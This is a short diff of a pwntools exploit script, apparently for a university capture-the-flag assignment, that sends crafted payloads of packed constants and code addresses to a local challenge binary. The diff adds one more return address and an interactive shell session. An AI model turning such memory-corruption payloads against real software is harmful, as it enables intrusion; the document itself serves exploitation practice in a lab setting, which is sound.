@@ -4,7 +4,6 @@ import pwn
 pwn.context.clear(arch="amd64")
 
 p = pwn.process("/home/cubscout61/Current/CS390R/Projects/project2/chall_1/chall")
-
 pwn.gdb.attach(target=p)
 
 main_payload = bytearray()
@@ -53,6 +52,7 @@ def check_3():
     c2_payload += pwn.p32(0x13371337)
     c2_payload += pwn.p64(0)
     c2_payload += pwn.p64(0x401334)
+    c2_payload += pwn.p64(0x4013fe)
     p.sendline(c2_payload)
     receve_input(p)
 
@@ -60,3 +60,5 @@ def check_3():
 challenge_1()
 check_2()
 check_3()
+receve_input(p)
+p.interactive()
